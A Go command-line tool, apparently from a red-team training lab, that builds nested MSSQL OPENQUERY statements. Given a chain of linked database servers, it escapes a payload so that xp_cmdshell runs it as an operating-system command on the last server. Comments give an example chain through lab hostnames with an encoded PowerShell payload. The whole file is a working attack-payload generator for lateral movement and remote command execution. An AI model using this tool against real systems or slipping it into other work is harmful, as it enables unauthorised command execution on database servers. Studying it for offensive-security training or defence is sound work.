package main

import (
	"fmt"
	"github.com/akamensky/argparse"
	"os"
    "strings"
    "math"
)

func powInt(x, y int) int {
    return int(math.Pow(float64(x), float64(y)))
}

func buildQuery(hosts []string, payload string){
    
    if len(hosts) == 1 {
        query := fmt.Sprintf("SELECT * FROM OPENQUERY(\"%s\", 'select @@servername; exec xp_cmdshell ''%s''')",hosts[0],payload)
        fmt.Print(query)
    }else {
        quotes := strings.Repeat("'", powInt(2,len(hosts)) )
        payload = "select @@servername; exec xp_cmdshell " + quotes + payload + quotes 
        for i:=len(hosts);i>0;i-- {
            //SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
            //data = "SELECT * FROM OPENQUERY(\"sql-1.cyberbotic.io\", 'select * from openquery(\"sql01.zeropointsecurity.local\", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')"
           
            quotes = strings.Repeat("'",powInt(2,i-1) )
            payload = fmt.Sprintf("select * from openquery(\"%s\",%s%s%s)",hosts[i-1],quotes,payload,quotes)


        }
        fmt.Print(payload + "\n") 
    } 
}


func main() {

    parser := argparse.NewParser("MSSQL-Query-Generator", "MSSQL Query generator")
    var hosts *[]string = parser.List("H", "hostname",&argparse.Options{Required: true, Help: "Define an ordered list of target(s)"})
    var payload *string = parser.String("p", "payload", &argparse.Options{Required: true, Help: "Payload to execute on the last target"} )
	// Parse input
	err := parser.Parse(os.Args)
	if err != nil {
		// In case of error print error and print usage
		// This can also be done by passing -h or --help flags
		fmt.Print(parser.Usage(err))
	}
	// Finally print the collected string
    buildQuery(*hosts, *payload)
}
